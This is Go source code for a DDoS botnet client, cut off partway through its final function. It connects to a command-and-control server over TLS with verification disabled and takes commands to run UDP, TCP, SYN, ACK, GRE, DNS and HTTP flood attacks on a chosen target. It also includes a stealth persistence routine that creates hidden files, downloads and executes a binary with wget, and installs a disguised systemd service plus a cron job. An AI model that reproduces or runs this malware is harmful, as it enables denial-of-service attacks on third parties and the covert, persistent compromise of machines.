package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

// ---------- packet constants ----------
const (
	PacketTypePing         = 0x01
	PacketTypePong         = 0x02
	PacketTypeCommand      = 0x03
	PacketTypeDiagnostic   = 0x04
	PacketTypeHeartbeat    = 0x05
	PacketTypeAuth         = 0x06
	PacketTypeAuthResponse = 0x07
)

// ---------- packet structures ----------
type PacketHeader struct {
	Type      uint8
	Length    uint32
	Timestamp int64
	Checksum  uint16
}

type Packet struct {
	Header  PacketHeader
	Payload []byte
}

type DNSResponse struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// ---------- bot ----------
type Bot struct {
	botID    string
	server   string
	conn     *tls.Conn
	stopChan chan struct{}
}

var botStartTime = time.Now()

func NewBot(botID, server string) *Bot {
	return &Bot{
		botID:    botID,
		server:   server,
		stopChan: make(chan struct{}),
	}
}

func (b *Bot) Start() {
	for {
		select {
		case <-b.stopChan:
			return
		default:
			if err := b.connect(); err != nil {
				fmt.Printf("[bot] connection failed: %v  (retrying in 5s)\n", err)
				time.Sleep(5 * time.Second)
				continue
			}
			if err := b.handleConnection(); err != nil {
				fmt.Printf("[bot] connection handler: %v\n", err)
			}
			if b.conn != nil {
				b.conn.Close()
			}
			time.Sleep(5 * time.Second)
		}
	}
}

func (b *Bot) connect() error {
	fmt.Println("[bot] dialing C2 server...")
	// Use a timeout for the initial connection attempt
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := tls.DialWithDialer(dialer, "tcp", b.server, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return fmt.Errorf("tls dial: %w", err)
	}
	b.conn = conn
	fmt.Println("[bot] connected – starting auth")

	// Ensure connection is closed on any error path within this function
	var success bool
	defer func() {
		if !success && b.conn != nil {
			b.conn.Close()
		}
	}()

	authPacket := CreatePacket(PacketTypeAuth, []byte(b.botID))
	if err := SendPacket(b.conn, authPacket); err != nil {
		return fmt.Errorf("send auth: %w", err)
	}

	resp, err := ReceivePacket(b.conn)
	if err != nil {
		return fmt.Errorf("recv auth resp: %w", err)
	}
	if resp.Header.Type != PacketTypeAuthResponse {
		return fmt.Errorf("unexpected auth resp type %d", resp.Header.Type)
	}
	fmt.Println("[bot] authentication successful")
	success = true // Mark as successful to prevent deferred close
	return nil
}

func (b *Bot) handleConnection() error {
	stopHb := make(chan struct{})
	defer close(stopHb)
	go b.heartbeatRoutine(stopHb)

	for {
		fmt.Println("[bot] waiting for packet...")
		packet, err := ReceivePacket(b.conn)
		if err != nil {
			if err == io.EOF {
				fmt.Println("[bot] server closed connection")
				return nil
			}
			fmt.Printf("[bot] error receiving packet: %v\n", err)
			return err
		}

		fmt.Printf("[bot] received packet - Type: %d, Length: %d\n", packet.Header.Type, packet.Header.Length)

		switch packet.Header.Type {
		case PacketTypePing:
			fmt.Println("[bot] received PING, sending PONG")
			if err := b.sendPong(); err != nil {
				return err
			}
		case PacketTypeCommand:
			fmt.Println("[bot] received COMMAND packet")
			b.handleCommand(packet)
		case PacketTypeHeartbeat:
			fmt.Println("[bot] received HEARTBEAT")
			if err := b.sendHeartbeatResponse(); err != nil {
				return err
			}
		case PacketTypeDiagnostic:
			fmt.Println("[bot] received DIAGNOSTIC request")
			if err := b.sendDiagnostics(); err != nil {
				fmt.Printf("[bot] send diagnostics: %v\n", err)
			}
		default:
			fmt.Printf("[bot] unknown packet type %d\n", packet.Header.Type)
		}
	}
}

func (b *Bot) heartbeatRoutine(stop <-chan struct{}) {
	tick := time.NewTicker(5 * time.Second)
	pingTick := time.NewTicker(15 * time.Second)
	defer tick.Stop()
	defer pingTick.Stop()

	for {
		select {
		case <-tick.C:
			fmt.Println("[bot] sending heartbeat")
			if err := b.sendHeartbeat(); err != nil {
				fmt.Printf("[bot] heartbeat send: %v\n", err)
				return
			}
		case <-pingTick.C:
			fmt.Println("[bot] sending ping")
			if err := b.sendAuthPacket(PacketTypePing, []byte("|ping|")); err != nil {
				fmt.Printf("[bot] ping send: %v\n", err)
				return
			}
		case <-stop:
			return
		}
	}
}

// ---------- heartbeat / pong ----------
func (b *Bot) sendHeartbeat() error {
	return b.sendAuthPacket(PacketTypeHeartbeat, []byte("|heartbeat|"))
}
func (b *Bot) sendHeartbeatResponse() error {
	return b.sendAuthPacket(PacketTypeHeartbeat, []byte("|heartbeat_response|"))
}
func (b *Bot) sendPong() error {
	return b.sendAuthPacket(PacketTypePong, []byte("|pong|"))
}
func (b *Bot) sendAuthPacket(typ uint8, marker []byte) error {
	payload := append([]byte(b.botID), marker...)
	pkt := CreatePacket(typ, payload)
	return SendPacket(b.conn, pkt)
}

func (b *Bot) handleCommand(pkt Packet) {
	fmt.Println("[bot] === COMMAND DEBUG START ===")
	fmt.Printf("[bot] Command payload length: %d\n", len(pkt.Payload))
	fmt.Printf("[bot] Command payload (hex): %s\n", hex.EncodeToString(pkt.Payload))

	// Binary CommandPacket is exactly 42 bytes
	if len(pkt.Payload) != 42 {
		fmt.Printf("[bot] ERROR: Expected 42 bytes, got %d\n", len(pkt.Payload))
		fmt.Println("[bot] === COMMAND DEBUG END ===")
		return
	}

	// Parse binary structure
	method := strings.TrimRight(string(bytes.TrimRight(pkt.Payload[0:16], "\x00")), " ")
	targetIP := net.IP(pkt.Payload[16:20]).String()
	port := binary.BigEndian.Uint16(pkt.Payload[20:22])
	duration := binary.BigEndian.Uint32(pkt.Payload[22:26])

	fmt.Printf("[bot] Parsed - Method: %s, Target: %s:%d, Duration: %d\n",
		method, targetIP, port, duration)

	fmt.Println("[bot] === COMMAND DEBUG END ===")

	// Execute the attack
	go b.executeAttack(method, targetIP, int(port), int(duration))
}

func (b *Bot) executeAttack(method, targetIP string, port, duration int) {
	fmt.Printf("[bot] EXECUTING ATTACK: %s on %s:%d for %d seconds\n", method, targetIP, port, duration)

	// Validate target IP
	if net.ParseIP(targetIP) == nil {
		fmt.Printf("[bot] ERROR: Invalid target IP: %s\n", targetIP)
		return
	}

	// Validate port
	if port < 1 || port > 65535 {
		fmt.Printf("[bot] ERROR: Invalid port: %d\n", port)
		return
	}

	// Validate duration
	if duration < 1 || duration > 3600 {
		fmt.Printf("[bot] ERROR: Invalid duration: %d\n", duration)
		return
	}

	// Create context with timeout
	_, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	switch strings.ToLower(method) {
	case "udp", "udpflood", "!udpflood":
		performUDPFlood(targetIP, port, duration)
	case "udpsmart", "!udpsmart":
		udpsmart(targetIP, port, duration)
	case "tcp", "tcpflood", "!tcpflood":
		TCPfloodAttack(targetIP, port, duration)
	case "syn", "synflood", "!synflood":
		performSYNFlood(targetIP, port, duration)
	case "ack", "ackflood", "!ackflood":
		if err := performACKFlood(targetIP, port, duration); err != nil {
			fmt.Printf("[bot] ACK flood error: %v\n", err)
		}
	case "gre", "greflood", "!greflood":
		if err := performGREFlood(targetIP, duration); err != nil {
			fmt.Printf("[bot] GRE flood error: %v\n", err)
		}
	case "dns", "!dns":
		performDNSFlood(targetIP, port, duration)
	case "http", "httpflood", "!http":
		performHTTPFlood(targetIP, port, duration)
	case "stop", "STOP":
		fmt.Printf("[bot] Received STOP command - stopping all attacks\n")
		// Implement stop logic if needed
	default:
		fmt.Printf("[bot] UNKNOWN command method: %s\n", method)
	}
}

func (b *Bot) sendDiagnostics() error {
	payload := make([]byte, 101)
	offset := 0

	writeFixedString(payload[offset:offset+16], runtime.GOOS)
	offset += 16

	writeFixedString(payload[offset:offset+8], runtime.GOARCH)
	offset += 8

	cpuInfo := fmt.Sprintf("%d cores", runtime.NumCPU())
	writeFixedString(payload[offset:offset+32], cpuInfo)
	offset += 32

	binary.BigEndian.PutUint64(payload[offset:offset+8], getTotalMemoryMB())
	offset += 8

	uptimeSeconds := uint64(time.Since(botStartTime).Seconds())
	binary.BigEndian.PutUint64(payload[offset:offset+8], uptimeSeconds)
	offset += 8

	binary.BigEndian.PutUint64(payload[offset:offset+8], uint64(time.Now().Unix()))
	offset += 8

	load1, load5, load15 := getLoadAverages()
	binary.BigEndian.PutUint32(payload[offset:offset+4], uint32(load1*100))
	offset += 4
	binary.BigEndian.PutUint32(payload[offset:offset+4], uint32(load5*100))
	offset += 4
	binary.BigEndian.PutUint32(payload[offset:offset+4], uint32(load15*100))
	offset += 4

	binary.BigEndian.PutUint64(payload[offset:offset+8], getDiskUsageMB())

	pkt := CreatePacket(PacketTypeDiagnostic, payload)
	return SendPacket(b.conn, pkt)
}

// ---------- packet layer ----------
func CreatePacket(typ uint8, payload []byte) Packet {
	ts := time.Now().UnixNano()
	// build full buffer first (header + payload) – checksum over [0:17] and [19:]
	buf := make([]byte, 19+len(payload))
	buf[0] = typ
	binary.BigEndian.PutUint32(buf[1:5], uint32(len(payload)))
	binary.BigEndian.PutUint64(buf[5:13], uint64(ts))
	// checksum slot zero for now
	copy(buf[19:], payload)

	// checksum = sha256(header[0:17] || payload) -> first 2 bytes
	sum := sha256.Sum256(append(buf[0:17], buf[19:]...))
	binary.BigEndian.PutUint16(buf[17:19], uint16(binary.BigEndian.Uint16(sum[0:2])))

	return Packet{
		Header: PacketHeader{
			Type:      typ,
			Length:    uint32(len(payload)),
			Timestamp: ts,
			Checksum:  binary.BigEndian.Uint16(buf[17:19]),
		},
		Payload: payload,
	}
}

func SendPacket(conn net.Conn, pkt Packet) error {
	buf := make([]byte, 19+len(pkt.Payload))
	buf[0] = pkt.Header.Type
	binary.BigEndian.PutUint32(buf[1:5], pkt.Header.Length)
	binary.BigEndian.PutUint64(buf[5:13], uint64(pkt.Header.Timestamp))
	// bytes 13:17 remain zero to match server packet layout
	binary.BigEndian.PutUint16(buf[17:19], pkt.Header.Checksum)
	copy(buf[19:], pkt.Payload)

	_, err := conn.Write(buf)
	return err
}

func ReceivePacket(conn net.Conn) (Packet, error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer conn.SetReadDeadline(time.Time{})

	hdrBuf := make([]byte, 19)
	if _, err := io.ReadFull(conn, hdrBuf); err != nil {
		return Packet{}, err
	}
	var hdr PacketHeader
	hdr.Type = hdrBuf[0]
	hdr.Length = binary.BigEndian.Uint32(hdrBuf[1:5])
	hdr.Timestamp = int64(binary.BigEndian.Uint64(hdrBuf[5:13]))
	hdr.Checksum = binary.BigEndian.Uint16(hdrBuf[17:19])

	if hdr.Length > 16*1024 { // max 16 KB payload
		return Packet{}, fmt.Errorf("packet too large (%d bytes)", hdr.Length)
	}
	var payload []byte
	if hdr.Length > 0 {
		payload = make([]byte, hdr.Length)
		if _, err := io.ReadFull(conn, payload); err != nil {
			return Packet{}, err
		}
	}
	// verify checksum
	full := make([]byte, 0, 17+len(payload))
	full = append(full, hdrBuf[0:17]...)
	full = append(full, payload...)
	sum := sha256.Sum256(full)
	if binary.BigEndian.Uint16(sum[0:2]) != hdr.Checksum {
		return Packet{}, fmt.Errorf("checksum mismatch")
	}
	return Packet{Header: hdr, Payload: payload}, nil
}

func writeFixedString(dst []byte, value string) {
	copy(dst, value)
	if len(value) < len(dst) {
		for i := len(value); i < len(dst); i++ {
			dst[i] = 0
		}
	}
}

func getTotalMemoryMB() uint64 {
	if data, err := os.ReadFile("/proc/meminfo"); err == nil {
		scanner := bufio.NewScanner(bytes.NewReader(data))
		for scanner.Scan() {
			line := scanner.Text()
			if strings.HasPrefix(line, "MemTotal:") {
				fields := strings.Fields(line)
				if len(fields) >= 2 {
					if kb, err := strconv.ParseUint(fields[1], 10, 64); err == nil {
						return kb / 1024
					}
				}
			}
		}
	}

	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return m.Sys / (1024 * 1024)
}

func getLoadAverages() (float64, float64, float64) {
	if data, err := os.ReadFile("/proc/loadavg"); err == nil {
		fields := strings.Fields(string(data))
		if len(fields) >= 3 {
			if l1, err1 := strconv.ParseFloat(fields[0], 64); err1 == nil {
				if l5, err2 := strconv.ParseFloat(fields[1], 64); err2 == nil {
					if l15, err3 := strconv.ParseFloat(fields[2], 64); err3 == nil {
						return l1, l5, l15
					}
				}
			}
		}
	}
	return 0, 0, 0
}

func getDiskUsageMB() uint64 {
	return 0
}

const numWorkers = 100

func resolveTarget(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("error resolving target: received status code %d", resp.StatusCode)
	}
	var dnsResp DNSResponse
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", fmt.Errorf("error decoding DNS response: %v", err)
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no DNS records found for target")
	}
	return dnsResp.Answer[0].Data, nil
}

// HTTP flood
func performHTTPFlood(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting HTTP flood on %s:%d for %d seconds\n", target, targetPort, duration)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	const highPacketSize = 1024
	var wg sync.WaitGroup
	resolvedIP, err := resolveTarget(target)
	if err != nil {
		fmt.Printf("Failed to resolve target: %v\n", err)
		return
	}

	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QP1A.190821.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
	}
	referers := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
		"https://www.reddit.com/",
		"https://www.github.com/",
	}
	acceptLanguages := []string{
		"en-US,en;q=0.9",
		"fr-FR,fr;q=0.9",
		"es-ES,es;q=0.9",
		"de-DE,de;q=0.9",
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				default:
					body := make([]byte, highPacketSize)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						fmt.Printf("Error creating request: %v\n", err)
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
					resp, err := client.Do(req)
					if err != nil {
						fmt.Printf("Error sending HTTP request: %v\n", err)
						continue
					}
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("HTTP flood complete. Requests sent: %d\n", atomic.LoadInt64(&requestCount))
}

// Udpsmart Flood
func udpsmart(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting randomized UDP flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address: %s\n", targetIP)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				fmt.Printf("Error listening for UDP: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					payloadSize := rand.Intn(10000) + 25400
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err := conn.WriteTo(payload, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						fmt.Printf("Error sending packet: %v\n", err)
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood complete. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
}

// UdpFlood
func performUDPFlood(targetIP string, targetPort, duration int) {
	fmt.Printf("Starting UDP flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup

	maxPayloadSize := 65507
	payload := make([]byte, maxPayloadSize)
	rand.Read(payload)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					sourcePort := rand.Intn(65535-1024) + 1024
					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: targetPort})
					if err != nil {
						fmt.Printf("Error creating UDP connection: %v\n", err)
						continue
					}
					_, err = conn.Write(payload)
					if err == nil {
						atomic.AddInt64(&packetCount, 1)
					} else {
						fmt.Printf("Error sending UDP packet: %v\n", err)
					}

					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood complete. Packets sent: %d\n", packetCount)
}

// DnsFlood
func performDNSFlood(targetIP string, targetPort, duration int) {
	fmt.Printf("Starting Enhanced DNS flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address: %s\n", targetIP)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup

	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				fmt.Printf("Error listening for UDP: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := constructDNSQuery(domain, queryType)
					buffer, err := dnsQuery.Pack()
					if err != nil {
						fmt.Printf("Error packing DNS query: %v\n", err)
						continue
					}
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						fmt.Printf("Error sending DNS packet: %v\n", err)
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("Enhanced DNS flood completed. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
}

// TcpFlood
func TCPfloodAttack(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address\n")
		return
	}
	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()

	fmt.Printf("TCP flood attack completed. Packets sent: %d\n", packetCount)
}

// SynFlood
func performSYNFlood(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())

	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address\n")
		return
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()

	fmt.Printf("SYN flood attack completed. Packets sent: %d\n", packetCount)
}

// AckFlood
func performACKFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						ACK:        true,
						Seq:        rand.Uint32(),
						Ack:        rand.Uint32(),
						Window:     12800,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP ACK packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()

					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("ACK flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// GreFlood
func performGREFlood(targetIP string, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}
	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					greLayer := &layers.GRE{}
					maxPacketSize := 65535
					ipAndGreHeadersSize := 20 + 4
					payloadSize := maxPacketSize - ipAndGreHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting GRE packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("GRE flood attack completed. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
	return nil
}

// Make the a DNS query message
func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)

	// Add EDNS0 to support larger responses
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096) // Use 4096 for max payload size
	msg.Extra = append(msg.Extra, edns0)

	return msg
}

var (
	killerEnabled          = true
	killDirectories        = []string{"/var/log", "/tmp", "/root/.cache"}
	whitelistedDirectories = []string{"/var/log/important.log"}
)

// Function to check if a directory is whitelisted
func isWhitelisted(dir string) bool {
	for _, whitelisted := range whitelistedDirectories {
		if dir == whitelisted {
			return true
		}
	}
	return false
}

// Function to stay on the device
func SystemdPersistence() {
	fmt.Println("Running hidden SystemdPersistence() routine for stealth persistence.")
	hiddenDir := "/var/lib/.systemd_helper"
	scriptPath := filepath.Join(hiddenDir, ".systemd_script.sh")
	programPath := filepath.Join(hiddenDir, ".systemd_process")
	url := "http://127.0.0.1/x86"
	err := os.MkdirAll(hiddenDir, 0755)
	if err != nil {
		fmt.Printf("Failed to create hidden directory: %v\n", err)
		return
	}
	fmt.Printf("Created hidden directory: %s\n", hiddenDir)
	scriptContent := fmt.Sprintf(`#!/bin/bash
	URL="%s"
	PROGRAM_PATH="%s"

	# Check if the program exists
	if [ ! -f "$PROGRAM_PATH" ]; then
		echo "Program not found. Downloading..."
		wget -O $PROGRAM_PATH $URL
		chmod +x $PROGRAM_PATH
	fi

	# Check if the program is running
	if ! pgrep -x ".systemd_process" > /dev/null; then
		echo "Program is not running. Starting..."
		$PROGRAM_PATH &
	else
		echo "Program is already running."
	fi
	`, url, programPath)
	err = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	if err != nil {
		fmt.Printf("Failed to create persistence script: %v\n", err)
		return
	}
	fmt.Printf("Successfully created hidden persistence script at %s\n", scriptPath)
	serviceContent := `[Unit]
						Description=System Helper Service
						After=network.target

						[Service]
						ExecStart=/var/lib/.systemd_helper/.systemd_script.sh
						Restart=always
						RestartSec=60
						StandardOutput=null
						StandardError=null

						[Install]
						WantedBy=multi-user.target
						`
	servicePath := "/etc/systemd/system/systemd-helper.service"
	err = os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		fmt.Printf("Failed to create systemd service: %v\n", err)
		return
	}
	fmt.Printf("Successfully created stealthy systemd service at %s\n", servicePath)
	cmd := exec.Command("systemctl", "enable", "--now", "systemd-helper.service")
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to enable and start service: %v\n", err)
		return
	}
	fmt.Println("Successfully enabled and started the stealth persistence service.")
	createCronJob(hiddenDir)
}

func createCronJob(hiddenDir string) {
	cronJob := fmt.Sprintf(`* * * * * bash %s/.systemd_script.sh > /dev/null 2>&1`, hiddenDir)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Failed to create cron job: %v\n", err)
		return
	}
	fmt.Println("Successfully created a cron job for backup persistence.")
}

// ---------- main ----------
func generateRandomID(length int) string {
	bytes := make([]byte, length/2)
